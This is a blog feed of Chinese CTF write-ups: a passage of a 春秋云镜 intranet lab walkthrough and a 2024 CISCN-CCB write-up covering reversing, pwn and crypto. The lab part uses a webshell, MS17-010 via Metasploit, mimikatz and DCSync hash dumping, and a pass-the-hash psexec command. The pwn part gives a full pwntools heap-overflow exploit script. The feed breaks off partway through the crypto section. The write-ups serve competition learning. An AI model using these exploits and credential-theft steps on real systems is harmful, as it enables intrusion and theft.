src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515272362-7c835135-4622-4088-bae9-5486657386b2.png" class="" title="img"><p>我这里直接连接队友上传的马</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536739183-b1fbf11f-42ff-4952-966f-89b501d3fd44.png" class="" title="img"><p>因为是 phpstudy 搭建的网站, 直接就是system权限</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516105119-b0069a99-1c70-4faa-9112-e2913295f19e.png" class="" title="img"><p>dir &#x2F;s &#x2F;b | find “flag” &gt; “C:\tmp.txt”导出到txt防止一段时间自动断开连接</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509122660-fcbe8912-697e-4c70-be7f-28e9a9edaa40.png" class="" title="img"><p>找到flag所在目录</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509138885-95a0a17e-97ce-40c0-98f1-dba0cd769c53.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508441566-9a5ccc79-82d7-47b9-8832-3230a524b1bd.png" class="" title="img"><h1 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h1><p>用代理启动msfconsole</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741511777054-eddc92ad-0e96-4066-97a8-58b778add673.png" class="" title="img"><p>use ms17-010</p><p>找到正向代理相关的payload</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537014019-7ee74aae-6ace-4ced-ab31-2671362404a8.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537215209-7bcff258-a82c-498c-85ea-a546331d79d9.png" class="" title="img"><p>队友之前用过4444来监听，这里换成4445</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537276384-ba09e790-1d1a-4dea-9b57-0c158a391aba.png" class="" title="img"><p>这里我run了五六次才成功，期间一直遇到fail</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741510029608-0df51d78-82de-4b2d-a9c9-0486e0ba037c.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537381682-a45ca320-ceb0-4b52-a2f0-c1a45d2afa40.png" class="" title="img"><p>导出hash，guest对应的是Empty String</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537477780-e0cd4e66-fa9d-43c2-a1dc-3510408ef8de.png" class="" title="img"><p>导入mimikatz后收集凭据</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537619463-4eb32de1-d6f1-48a1-b373-ca0db1e1097d.png" class="" title="img"><p>这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537689801-19b37d4c-aa41-458b-98d2-080b4a0e7cc4.png" class="" title="img"><p>安装impacket</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537765310-39aa47b0-f116-490c-8589-ba77b2cc6b30.png" class="" title="img"><p>psexec凭据传递攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> psexec.py -dc-ip <span class="hljs-number">172.22.1.2</span> -hashes :<span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8 XIAORANG.LAB/administrator@<span class="hljs-number">172.22.1.18</span><br></code></pre></td></tr></table></figure><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537914591-e8a86703-071e-4cda-b7ee-5528c3a98d7c.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516372835-d6013e8b-7a54-4b99-b3f9-2fff10c897e8.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024ciscn-ccb初赛部分wp</title>
    <link href="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h2><p>找到rc4和key</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734233399837-a8ab687d-361e-434c-bb2f-7410437c2696.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x96</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x64</span>,<br>  <span class="hljs-number">0x92</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB8</span>,<br>  <span class="hljs-number">0x63</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x06</span>,<br>  <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x40</span>,<br>  <span class="hljs-number">0xED</span>, <span class="hljs-number">0xD1</span>])<br>key = <span class="hljs-string">b&#x27;testkey&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure><p>得到的密文发现最后一位是125，第一位和f异或得到l，猜测是相邻异或，而且程序前面也有xor模块</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734233444925-7dbf841f-360a-47a3-b7ce-e635e4ccfd1c.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">28</span>, <span class="hljs-number">31</span>, <span class="hljs-number">84</span>, <span class="hljs-number">86</span>, <span class="hljs-number">83</span>, <span class="hljs-number">87</span>, <span class="hljs-number">81</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">29</span>, <span class="hljs-number">20</span>, <span class="hljs-number">88</span>, <span class="hljs-number">86</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">84</span>, <span class="hljs-number">3</span>, <span class="hljs-number">75</span>, <span class="hljs-number">20</span>, <span class="hljs-number">88</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">73</span>, <span class="hljs-number">76</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">81</span>, <span class="hljs-number">12</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">79</span>, <span class="hljs-number">125</span>]<br>flag=<span class="hljs-string">&#x27;f&#x27;</span><br>ch=<span class="hljs-string">&#x27;f&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">1</span>):<br>    tmp=<span class="hljs-built_in">ord</span>(ch)^a[i]<br>    flag+=<span class="hljs-built_in">chr</span>(tmp)<br>    ch=<span class="hljs-built_in">chr</span>(tmp)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#flag&#123;d0f5b330-9a74-11ef-9afd-acde48001122&#125;</span><br></code></pre></td></tr></table></figure><h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><p>程序会解析输入参数</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734257745708-db58e50c-b96e-47ec-a99f-881d3abf9a22.png" class="" title="img"><p>输入flag发现刚好对的上</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734257806075-b5137431-e27d-4586-911d-e5e9214f3347.png" class="" title="img"><p>经过测试猜测是单表代换，且00表示4</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734257881801-7a89040b-9458-4edc-98e7-971d790f96c5.png" class="" title="img"><p>把大部分可见字符的映射都找出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># s=&#x27;2e34222f313632262c2d1e3021232425272829373520331f2b2a12180613151a160a10110214050708090b0c0d1b190417030f0e1c1d&#x27;</span><br><span class="hljs-comment"># for i in range(0,0xlen(s),0x2):</span><br><span class="hljs-comment">#     print(s[i],0xend=&quot;&quot;)</span><br><span class="hljs-comment">#     print(s[i+1],0xend=&quot;,0x&quot;)</span><br>a=[<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x0b</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x01</span>]<br>s=<span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM124&#123;&#125;=&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>a1=[<span class="hljs-number">0x23</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x1D</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x39</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a1)):<br>    <span class="hljs-built_in">print</span>(s[a.index(a1[i])],end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment">#flag&#123;MTczMDc4MzQ2Ng==&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h2><p><a href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p><p>查看保护</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734258432973-db509a2f-bb2a-446b-856b-3f5136c198b9.png" class="" title="img"><p>无法反编译菜单</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734258170474-3126392c-a5a7-4307-9df0-6d57ce3ce13c.png" class="" title="img"><p>发现后门函数</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734233668043-6c331b5d-9c68-469e-972b-cf21043b548f.png" class="" title="img"><p>gift泄露堆地址</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734260112732-393e4380-c533-46ca-994b-2f8352213048.png" class="" title="img"><p>有堆溢出</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734234500205-83fa7b63-6c49-43fe-864e-ca726a73bff1.png" class="" title="img"><p>函数调用需要经过两次地址读，两次取地址后直接getshell</p><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734260168867-ac7e5d01-8ab2-4068-be98-b002b5da90e8.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>filename=<span class="hljs-string">&#x27;./note&#x27;</span><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;39.107.73.132&#x27;</span>,<span class="hljs-number">34877</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>    <span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;index: &#x27;</span>)<br>    sl(index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,payload</span>):<br>    ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;index: &#x27;</span>)<br>    sl(index)<br>    ru(<span class="hljs-string">b&#x27;len: &#x27;</span>)<br>    sl(size)<br>    ru(<span class="hljs-string">b&#x27;content: &#x27;</span>)<br>    sl(payload)<br><br>system = <span class="hljs-number">0x80489ce</span><br><br>add()<br>add()<br>add()<br>add()<br>add()<br><br>ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;index: &#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;gift: &#x27;</span>)<br>gift=io.recvline()<br>gift = gift.strip()<br><span class="hljs-built_in">str</span> = gift.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>gift_int = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>,<span class="hljs-number">16</span>)<br>gift_int = gift_int+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p32(gift_int)<br>edit(<span class="hljs-string">b&#x27;1&#x27;</span>,<span class="hljs-string">b&#x27;28&#x27;</span>,payload)<br>edit(<span class="hljs-string">b&#x27;4&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>,p32(system))<br>edit(<span class="hljs-string">b&#x27;2&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>inter()<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rasnd-2"><a href="#rasnd-2" class="headerlink" title="rasnd-2"></a>rasnd-2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> os<br><br>FLAG = os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>).encode()<br>flag1 = FLAG[:<span class="hljs-number">15</span>]<br>flag2 = FLAG[<span class="hljs-number">15</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto1</span>():<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">0x10001</span><br>    x1=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>)<br>    y1=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">114</span>)<br>    x2=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>)<br>    y2=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">514</span>)<br>    hint1=x1*p+y1*q-<span class="hljs-number">0x114</span><br>    hint2=x2*p+y2*q-<span class="hljs-number">0x514</span><br>    c = <span class="hljs-built_in">pow</span>(bytes_to_long(flag1), e, n)<br>    <span class="hljs-built_in">print</span>(n)<br>    <span class="hljs-built_in">print</span>(c)<br>    <span class="hljs-built_in">print</span>(hint1)<br>    <span class="hljs-built_in">print</span>(hint2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto2</span>():<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">0x10001</span><br>    hint = <span class="hljs-built_in">pow</span>(<span class="hljs-number">514</span>*p - <span class="hljs-number">114</span>*q, n - p - q, n)<br>    c = <span class="hljs-built_in">pow</span>(bytes_to_long(flag2),e,n)<br>    <span class="hljs-built_in">print</span>(n)<br>    <span class="hljs-built_in">print</span>(c)<br>    <span class="hljs-built_in">print</span>(hint)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;==================================================================&quot;</span>)<br>crypto1()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;==================================================================&quot;</span>)<br>crypto2()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;==================================================================&quot;</span>)<br>==================================================================<br><span class="hljs-number">26714373031565422475884702170543410883373766932797969939280017108800123630280453788616378655019907797321111510231223356874948261879543789404350524004468888206101183893553783912724380985843610867526595833197366734130545820436239872839652589346601722085131378640769423529086811124172931366238980772713375464558442159355269775101329989966189515569376297816482517053422913115432001741932739141823138624540815101536913889794642390866813927702475029110686952078530692644252976502169483149132207976114466199894323910052111367201536776408811236973236608134901114724266365223503175620708205259026706410636563563598898057786909</span><br><span class="hljs-number">18858506514752992181380154921747008058551432073649358179756400934499734929302097177385112589545638411907187544107364140903835767319765333083263371380171393252284034199968302788035813879025587162178319401359969618990483649417087485156561735201401525887885578022049717026480327032286788738889262482959544912750982820940453807386818377755465477978307315597575247620998533718055915017425523414691659570184139579810707813137941428133321379443751166951391551543594842911886444134180462626200534122766826612914831934523911294746691771890773567919420040686512711305345502628357059345018604242583923374930982823519300498861640</span><br><span class="hljs-number">1703011784973694423523066984917892124619751172220144100044171439741165827972687390194124492251819042874252053150043202421782626869660480593115676811212128468596849367155081033328244384876406655473674390204200669968111480368833514298396052119966333625037144526212890106844115852680816838761270006004920982100788509334477038784632813857002635218</span><br><span class="hljs-number">8596233896763717102169465608296028563515760739865995489935176725834214423578223747479973270599042824129419113680720794797661942367252581426481246316950815033131044242281997122567448742644673474903897866662886581037133335517704055756596838356619756825253469733432939827965726694808136837419859121356935545730046078254006901859741103020585105901848211173408398897737180145151960784779409091748948609728701125179059580873942337600282247998167059927473965882018545884</span><br>==================================================================<br><span 